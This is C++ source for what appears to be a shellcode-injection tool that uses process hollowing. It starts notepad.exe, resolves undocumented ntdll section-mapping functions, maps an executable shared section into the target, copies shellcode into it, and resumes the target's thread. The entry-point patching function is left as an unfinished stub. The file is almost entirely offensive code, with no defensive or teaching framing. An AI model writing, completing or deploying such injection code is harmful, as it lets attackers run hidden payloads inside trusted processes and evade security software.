#include "pch.h"
#include "define.h"
#include "datastruct.h"
#include "hkutil.h"
#include "hkprocess.h"
#include "hklocal.h"

bool hk_local::hollowTarget(DWORD PID) noexcept {
  if (!PID) {
    LOG(logError, "Invalid process ID. Either the process is not running or "
        "couldn't be detected.");
    return false;
  }

  // initialization
  HANDLE hRThread = NULL;
  DWORD idRThread = 0;
  LPCSTR processPath = "C:\\Windows\\System32\\notepad.exe";
  LPVOID pTgtSectionView = nullptr;
  ULONG retLength = 0;
  LUID privID{};

  // create function objects
  TUnmapViewOfSection hkUnmapViewOfSection =
      (TUnmapViewOfSection)hk_util::procAddr("ntdll", "ZwUnmapViewOfSection");

  // UNUSED
  TCreateUserThread hkCreateUserThread =
      (TCreateUserThread)hk_util::procAddr("ntdll", "RtlCreateUserThread");
  TResumeProcess hkResumeProcess =
      (TResumeProcess)hk_util::procAddr("ntdll", "NtResumeProcess");
  //
  /*
  //LOGn("Setting debug privilege...\t\t");
  if (hk_util::setLocalPrivilege("SeDebugPrivilege")) {  // unused right now
    //LOG("Failure.");
    //ERRCHK;
  };

  LOG("Creating target process data structure.");*/

  hkProcess targetProc(processPath);
  hkShellCode shellCode(hk_util::shellCode, hk_util::shellCodeSize);

  if (!(pTgtSectionView = mapShellCodeIntoTargetProcess(&targetProc, &shellCode))) {
    LOG(logError, "Shell code injection failed. Error code: %d", GetLastError());
        return false;
  }

  injectAtEntry(&targetProc, &pTgtSectionView);

  if(targetProc.resetContext()) {
    LOG(logWarning, "Failed to properly restore context for the target process thread. Error Code: %d",
        GetLastError());
  };
  ResumeThread(targetProc.hThread);

  // cleanup
  _getch();
  CloseHandle(hRThread);
  TerminateProcess(targetProc.hProcess, 0);

  return true;
}

void* hk_local::mapShellCodeIntoTargetProcess(hkProcess* pTarget, hkShellCode* pCode) noexcept {
  
  HANDLE hSection = NULL;
  LARGE_INTEGER sectionSize{};
  LPVOID lpSectionLocal = nullptr, lpSectionTarget = nullptr;
  sectionSize.QuadPart = pCode->size;

  TCreateSection hkCreateSection =
      (TCreateSection)hk_util::procAddr("ntdll", "NtCreateSection");
  TMapViewOfSection hkMapViewOfSection =
      (TMapViewOfSection)hk_util::procAddr("ntdll", "NtMapViewOfSection");

  LOG(logOK, "Creating section at 0x%x, size %d.", hkCreateSection, sectionSize.QuadPart);
  hkCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize,
                  PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

  LOG(logOK, "Mapping local section view...");
  hkMapViewOfSection(hSection, GetCurrentProcess(), &lpSectionLocal, NULL, NULL,
                     NULL, &pCode->size, 2, NULL, PAGE_READWRITE);
  LOG(logOK, "Mapped local section view at 0x%x", lpSectionLocal);

  LOG(logOK, "Mapping target section view for PID %d...", pTarget->dwProcessId);

  if (hkMapViewOfSection(hSection, pTarget->hProcess, &lpSectionTarget,
                         NULL, NULL, NULL, &pCode->size, 2, NULL,
                         PAGE_EXECUTE_READ) != 0) {
    LOG(logError, "Failed to map target section view. Error code: %d", GetLastError());
    return nullptr;
  };

  LOG(logOK, "Mapped target section view at 0x%x", lpSectionTarget);

  LOGn(logOK, "Copying shellcode to the new section...\t\t");

  memcpy(lpSectionLocal, pCode->pData, pCode->size);

  LOG(logOK, "SUCCESS.\n");

  CloseHandle(hSection);

  return lpSectionTarget;
}

DWORD hk_local::injectAtEntry(hkProcess* pTarget, void* pCodeView) noexcept {

  BYTE jmpCode[9];
  jmpCode[0] = 0xE9;        // JMP
  uint64_t* jmpPtr = (uint64_t*)&jmpCode[1];
  *jmpPtr = 0x00000000;

  return 0;     // SUCCESS
}
